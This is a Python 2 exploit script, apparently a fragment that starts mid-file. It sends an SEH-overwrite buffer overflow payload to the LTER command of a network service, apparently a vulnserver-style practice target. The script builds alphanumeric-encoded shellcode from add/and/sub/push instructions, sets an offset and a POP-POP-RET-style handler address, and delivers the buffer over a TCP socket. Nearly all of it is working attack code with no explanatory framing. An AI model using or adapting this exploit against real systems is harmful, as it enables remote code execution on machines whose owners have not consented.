shellcode += "\x05\x21\x45\x24\x25" ## add  eax, 0x25244521
shellcode += "\x05\x11\x33\x24\x24" ## add  eax, 0x24243311
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x33\x46\x31" ## add  eax, 0x31463331
shellcode += "\x05\x21\x24\x45\x21" ## add  eax, 0x21452421
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x64\x62\x72" ## add  eax, 0x72626411
shellcode += "\x05\x12\x53\x51\x61" ## add  eax, 0x61515312
shellcode += "\x05\x11\x43\x62\x52" ## add  eax, 0x52624311
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x21\x61\x67\x16" ## add  eax, 0x16676121
shellcode += "\x05\x11\x52\x56\x16" ## add  eax, 0x16565211
shellcode += "\x05\x21\x41\x45\x14" ## add  eax, 0x14454121
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x36\x01\x16" ## add  eax, 0x16013631
shellcode += "\x05\x30\x46\x01\x16" ## add  eax, 0x16014630
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x21\x77\x56\x26" ## add  eax, 0x26567721
shellcode += "\x05\x22\x66\x45\x25" ## add  eax, 0x25456622
shellcode += "\x05\x21\x55\x44\x24" ## add  eax, 0x24445521
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x17\x64\x35\x23" ## add  eax, 0x23356417
shellcode += "\x05\x16\x53\x24\x13" ## add  eax, 0x13245316
shellcode += "\x05\x15\x33\x24\x23" ## add  eax, 0x23243315
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x12\x46\x31\x14" ## add  eax, 0x14314612
shellcode += "\x05\x02\x45\x41\x14" ## add  eax, 0x14414502
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x31\x06\x46\x31" ## add  eax, 0x31460631
shellcode += "\x05\x21\x06\x45\x21" ## add  eax, 0x21450621
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x46\x30\x20\x46" ## add  eax, 0x46203046
shellcode += "\x05\x45\x20\x10\x45" ## add  eax, 0x45102045
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x73\x21\x60\x32" ## add  eax, 0x32602173
shellcode += "\x05\x72\x10\x60\x32" ## add  eax, 0x32601072
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x11\x11\x31\x44" ## add  eax, 0x44311111
shellcode += "\x05\x11\x11\x31\x44" ## add  eax, 0x44311111
shellcode += "\x05\x11\x11\x31\x34" ## add  eax, 0x34311111
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax
shellcode += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
shellcode += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
shellcode += "\x05\x76\x64\x42\x11" ## add  eax, 0x11426476
shellcode += "\x05\x65\x54\x41\x11" ## add  eax, 0x11415465
shellcode += "\x05\x54\x63\x32\x11" ## add  eax, 0x11326354
shellcode += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
shellcode += "\x50"                 ## push eax

#SEH chain of thread 00000B70, item 0 Address=00BCFFDC SE handler=45366D45
#0x6250160A
#offset 3498
buffer = "C" * 50 + shellcode + "C" * (3378-len(shellcode)-50) + encoded_long_jmp + "C" * (3494 - 3368 - 10 - len(encoded_long_jmp)) + "\x75\xFF\x74\xFF" + "\x0A\x16\x50\x62" + "C" * 1000
try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
        s.send('LTER /.:/ ' + buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
